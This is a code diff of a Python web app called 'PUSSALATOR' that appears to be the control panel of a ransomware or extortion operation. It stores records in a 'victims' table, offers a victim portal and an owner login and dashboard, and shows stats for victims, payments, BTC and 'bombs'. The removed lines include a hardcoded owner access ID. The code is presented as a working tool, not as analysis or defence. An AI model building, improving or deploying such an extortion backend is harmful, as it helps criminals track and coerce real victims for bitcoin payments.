@@ -62,10 +62,9 @@ class Config:
     ENVIRONMENT = os.environ.get('ENVIRONMENT', 'production')
     LOG_LEVEL = os.environ.get('LOG_LEVEL', 'WARNING')
     
-    # Supabase config - get these from your Supabase project settings [citation:3][citation:6]
+    # Supabase config
     SUPABASE_URL = os.environ.get('SUPABASE_URL', '')
-    SUPABASE_KEY = os.environ.get('SUPABASE_KEY', '')  # Use anon/public key for client ops
-    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY', '')  # Use service_role key for admin ops
+    SUPABASE_KEY = os.environ.get('SUPABASE_KEY', '')
 
 # ============================================================================
 # LOGGING
@@ -86,21 +85,10 @@ logger = logging.getLogger('pussalator')
 # ============================================================================
 
 supabase: Optional[Client] = None
-supabase_admin: Optional[Client] = None
-
 if Config.SUPABASE_URL and Config.SUPABASE_KEY:
     try:
-        # Public client (respects RLS) [citation:3]
         supabase = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
-        
-        # Admin client (bypasses RLS) - if service key provided [citation:3]
-        if Config.SUPABASE_SERVICE_KEY:
-            supabase_admin = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
-            logger.info("✅ Supabase admin client connected")
-        else:
-            supabase_admin = supabase
-            logger.info("✅ Supabase public client connected (using anon key)")
-            
+        logger.info("✅ Supabase connected")
     except Exception as e:
         logger.error(f"❌ Supabase connection failed: {e}")
 
@@ -183,12 +171,10 @@ class Database:
     def _init_supabase(self):
         """Verify Supabase connection"""
         try:
-            # Test connection by fetching a single row [citation:4]
             result = supabase.table('victims').select('*').limit(1).execute()
             logger.info(f"✅ Supabase connection verified, table 'victims' exists")
         except Exception as e:
             logger.error(f"❌ Supabase table error: {e}")
-            logger.error("Please create the 'victims' table using the SQL schema provided")
     
     def _load_local(self):
         """Load from local JSON file (fallback)"""
@@ -262,14 +248,12 @@ class Database:
         
         if self.use_supabase:
             try:
-                # Insert into Supabase [citation:4]
                 data = supabase.table('victims').insert(victim).execute()
                 if data.data:
                     logger.info(f"Victim added to Supabase: {victim_id}")
                     return victim
             except Exception as e:
                 logger.error(f"Supabase insert error: {e}")
-                # Fallback to local
                 self.victims[victim_id] = victim
         else:
             self.victims[victim_id] = victim
@@ -520,9 +504,10 @@ app.add_middleware(
 )
 
 # ============================================================================
-# HTML TEMPLATES - Separate Pages with Stable Display
+# HTML TEMPLATES - FIXED: Properly assigned to variables
 # ============================================================================
 
+INDEX_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -569,44 +554,34 @@ app.add_middleware(
             font-size: 18px;
         }
         
-        .input-group {
-            margin: 30px 0;
-        }
-        
-        .input-field {
-            background: black;
-            border: 2px solid #ff0000;
-            color: #00ff00;
-            padding: 15px;
-            font-family: 'Courier New', monospace;
-            font-size: 18px;
-            width: 300px;
-            margin: 10px;
-            text-align: center;
-        }
-        
-        .input-field:focus {
-            outline: none;
-            border-color: #00ff00;
-            box-shadow: 0 0 20px #ff0000;
-        }
-        
         .button {
             background: #ff0000;
             color: black;
             border: none;
-            padding: 15px 40px;
+            padding: 15px 30px;
             font-family: 'Courier New', monospace;
             font-weight: bold;
             font-size: 18px;
             cursor: pointer;
             margin: 10px;
+            width: 250px;
             transition: 0.3s;
         }
         
         .button:hover {
             background: #ff6666;
             box-shadow: 0 0 20px #ff0000;
+        }
+        
+        .victim-button {
+            background: black;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+        }
+        
+        .victim-button:hover {
+            background: #00ff00;
+            color: black;
         }
         
         .ascii {
@@ -622,82 +597,40 @@ app.add_middleware(
             font-size: 14px;
             min-height: 30px;
         }
-        
-        .message {
-            color: #ff6666;
-            margin-top: 20px;
-            min-height: 30px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="ascii">
-    /\____/\    /\____/\
+    /\\____/\\    /\\____/\\
    (  o  o  )  (  o  o  )
    (   ==   )  (   ==   )
     (______)    (______)
         </div>
         
         <h1>PUSSALATOR</h1>
-        <div class="subtitle">> ENTER ACCESS ID <</div>
+        <div class="subtitle">> SYSTEM CONTROL PANEL <</div>
         
-        <div class="input-group">
-            <input type="text" id="access_id" class="input-field" placeholder="ENTER ID" onkeypress="handleKey(event)">
-            <button class="button" onclick="submitId()">SUBMIT</button>
-        </div>
+        <a href="/victim">
+            <button class="button victim-button">VICTIM PORTAL</button>
+        </a>
         
-        <div id="message" class="message"></div>
+        <a href="/owner/login">
+            <button class="button">OWNER LOGIN</button>
+        </a>
         
-        <div class="stats" id="stats">Loading system data...</div>
+        <div class="stats" id="stats">Loading stats...</div>
     </div>
 
     <script>
-        const OWNER_ID = '40671Mps19*'; // The special owner ID
-        
-        function handleKey(e) {
-            if (e.key === 'Enter') {
-                submitId();
-            }
-        }
-        
-        async function submitId() {
-            const id = document.getElementById('access_id').value.trim();
-            const messageDiv = document.getElementById('message');
-            
-            if (!id) {
-                messageDiv.innerHTML = 'Please enter an ID';
-                return;
-            }
-            
-            // Check if it's the owner ID
-            if (id === OWNER_ID) {
-                window.location.href = '/owner/dashboard';
-                return;
-            }
-            
-            // Check if it's a victim ID
-            try {
-                const response = await fetch(`/api/victim/${id}`);
-                if (response.status === 200) {
-                    window.location.href = `/victim/${id}`;
-                } else {
-                    messageDiv.innerHTML = 'Invalid ID';
-                    document.getElementById('access_id').value = '';
-                }
-            } catch(e) {
-                messageDiv.innerHTML = 'Connection error';
-            }
-        }
-        
         async function loadStats() {
             try {
                 const r = await fetch('/api/stats');
                 const s = await r.json();
                 document.getElementById('stats').innerHTML = 
-                    `Total: ${s.total} | Resolved: ${s.paid} | Pending: ${s.unpaid} | Active: ${s.bombs}`;
+                    `Victims: ${s.total} | Paid: ${s.paid} | BTC: ${s.btc} | Bombs: ${s.bombs}`;
             } catch(e) {
-                document.getElementById('stats').innerHTML = 'System data unavailable';
+                document.getElementById('stats').innerHTML = 'Stats temporarily unavailable';
             }
         }
         
@@ -1569,7 +1502,6 @@ OWNER_DASHBOARD_HTML = """
             document.getElementById('timestamp').innerText = new Date().toLocaleString();
         }
         
-        // Start periodic updates (every 10 seconds instead of 3)
         function startUpdates() {
             loadStats();
             loadVictims();
@@ -1592,6 +1524,7 @@ OWNER_DASHBOARD_HTML = """
 </body>
 </html>
 """
+
 # ============================================================================
 # API ROUTES
 # ============================================================================
